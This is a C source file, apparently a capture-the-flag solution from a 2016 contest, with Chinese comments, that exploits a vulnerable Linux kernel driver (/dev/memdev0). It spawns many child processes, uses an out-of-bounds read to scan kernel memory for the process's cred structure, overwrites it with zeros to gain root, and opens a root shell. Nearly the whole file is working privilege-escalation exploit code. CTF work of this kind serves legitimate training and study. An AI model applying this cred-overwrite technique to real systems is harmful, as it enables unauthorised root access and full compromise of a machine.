/*
* @Subject:
* @Model:
* @Compile-cmd: gcc -Wall
*
* @Author:    LiuKun
* @Date:      2016-11-16 11:46:18
* @Email:     liukun@antiy.cn
* @File Path: /Users/liukun/work/Train/contest/2016-52Crack/2/writeup/pwn1.c
* @Create Time: 2016-11-16 11:46:18
* @Last Modified by:   FloatingGuy
* @Last Modified time: 2016-11-16 17:21:09
* @Reference:
*
* 简单粗暴的方法。
*
* 缺点：
* 	失败的几率较大，有可能读不到 cred.
*
* 重要的函数：
* 	void* memmem(memory_zone, zone_size, target_memory, target_size)  在一片内存中查找指定的字节串(结构体对象)。
* 	 	参数1，2： 指定的一块内存区域,区域大小
* 	 	参数3,4:  要查找的 内存结构（字节）
* 	 	返回值： 第一个匹配到的子字节串指针
*
* 子进程暂停
* 	raise(SIGSTOP);
* 父进程 唤醒子进程（开始执行功能）
* 	kill(sub_pid, SIGCONT);
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>

#define MAX_CHILDREN_PROCESS 1024

struct cred {

        // unsigned long usage;

        uid_t uid;            /* real UID of the task */

        gid_t gid;            /* real GID of the task */

        uid_t suid;           /* saved UID of the task */

        gid_t sgid;           /* saved GID of the task */

        uid_t euid;           /* effective UID of the task */

        gid_t egid;           /* effective GID of the task */

        uid_t fsuid;          /* UID for VFS ops */

        gid_t fsgid;          /* GID for VFS ops */

        // unsigned long securebits;     /* SUID-less security management */

        // kernel_cap_t cap_inheritable; /* caps our children can inherit */

        // kernel_cap_t cap_permitted;  /* caps we're permitted */

        // kernel_cap_t cap_effective;  /* caps we can actually use */

        // kernel_cap_t cap_bset;       /* capability bounding set */

        // unsigned char jit_keyring;

        // void *thread_keyring;

        // void *request_key_auth;

        // void *tgcred;

        // void *security;      /* subjective LSM security */

} my_cred = {0};

void print() {
	printf("uid = %d, gid = %d,fsgid = %d\n", my_cred.uid, my_cred.gid, my_cred.fsgid );
}


struct mem_init {
	uint32_t idx;
	uint32_t len;
} data = {0, 8};

static pid_t pids[MAX_CHILDREN_PROCESS];

static int children_num;

struct mem_dev
{
	unsigned long size;
	char *data;
};


// 检测 当前进程是否是 root
static void tryRoot() {
	// 让子进程暂停，等父进程发送 SIGCONT 信号，再唤醒子进程
	raise(SIGSTOP);
	if (getuid() == 0)
	{
		printf("root success!\n");
		system("/bin/sh");    // 开启 root 权限的终端
	}
	exit(0);  //父进程退出
}

// 创建大量子进程，
// 在子进程中 检测是否是有 root 权限，如果有 就 system("/bin/sh")
static void sprayingChildProcess() {
	int i;
	int pid;

	for (i = 0; i < MAX_CHILDREN_PROCESS; i++) {
		pid = fork();
		if (pid < 0) {
			break;
		}
		else if(pid == 0) {
			tryRoot();
		}
		else {
			pids[i] = pid;
		}
	}

	children_num = i;  //创建的子进程总数

}

// 设置当前 进程的 cred 对象的内存签名
static void setMyCred() {
    uid_t suid;
    gid_t sgid;
    uid_t euid;
    gid_t egid;
    uid_t ruid;
    gid_t rgid;

    getresuid(&ruid, &euid, &suid);
    getresgid(&rgid, &egid, &sgid);

    my_cred.uid = getuid();
    my_cred.gid = getgid();
    my_cred.suid = suid;
    my_cred.sgid = sgid;
    my_cred.euid = euid;
    my_cred.egid = egid;
    my_cred.fsuid = getuid();
    my_cred.fsgid = getgid();
}

// 利用 read 函数越界读 堆内存及更高的内存地址
static int searchCred(int fd) {
	int ret, p, cred;
	char buf[4096];

	setMyCred();
	ret = ioctl(fd, 0, &data);

	if (ret != 0) {
		perror("ioctl");
		return 0;
	}

	while(1) {
		ret = read(fd, buf, 4096);
		if (ret != 4096) {
			perror("read");
			return 0;
		}

		p = memmem(buf, 4096, &my_cred, sizeof(my_cred));

		if (p) {
			 printf("we find current process's cred\n");
			 cred = p - (int)buf + lseek(fd, 0, SEEK_CUR) - 4096;  //获取 cred 的内核地址
			 return cred;
		}

	}

	return 0;
}


static void modifyCred(int fd, int cred) {

	struct cred new_cred;

	lseek(fd, cred, SEEK_SET);
	memset(&new_cred, 0, sizeof(new_cred));
	write(fd, &new_cred,sizeof(new_cred));   //写入全0的 cred
	printf("modify cred over.\n");
}


static void test() {
	print();
}


int main(int argc, char const *argv[])
{
	/* code */

	int fd, cred, i;
	// test()

	sprayingChildProcess();

	fd = open("/dev/memdev0", O_RDWR);
	if (fd < 0) {
		perror("open");
		goto out;
	}

	cred = searchCred(fd);   //返回相对文件开头的偏移 off_t
	if (cred == 0) {
		goto out;
	}

	modifyCred(fd, cred);

// 析构操作
out:
	if (fd > 0) {
		close(fd);
	}

	for (i = 0; i < children_num; ++i) {
		kill(pids[i], SIGCONT);	// 子进程退出
	}

	//等待 所有子进程退出，收尸
	while (1) {
		if (wait(NULL) < 0) {
			break;
		}
	}
	return 0;
}